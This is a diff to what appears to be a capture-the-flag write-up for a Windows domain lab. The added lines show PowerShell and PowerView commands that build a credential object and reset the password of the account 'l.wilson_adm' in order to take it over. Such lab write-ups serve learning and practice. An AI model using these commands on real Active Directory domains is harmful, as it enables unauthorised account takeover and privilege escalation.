@@ -272,5 +272,12 @@ I now have a shell!
 This user can change the admin accounts password
 
 ```python
-
+PS C:\> $SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+PS C:\> $Cred = New-Object System.Management.Automation.PSCredential('GARFIELD\l.wilson_adm', $SecPassword)
+PS C:\> $UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+PS C:\> Set-DomainUserPassword -Identity l.wilson_adm -AccountPassword $UserPassword -Credential $Cred
+PS C:\> 
 ```
+
+Since i dont know the `l.wilson` account creds i cannot do this remotely, but i can do it with powershell
+
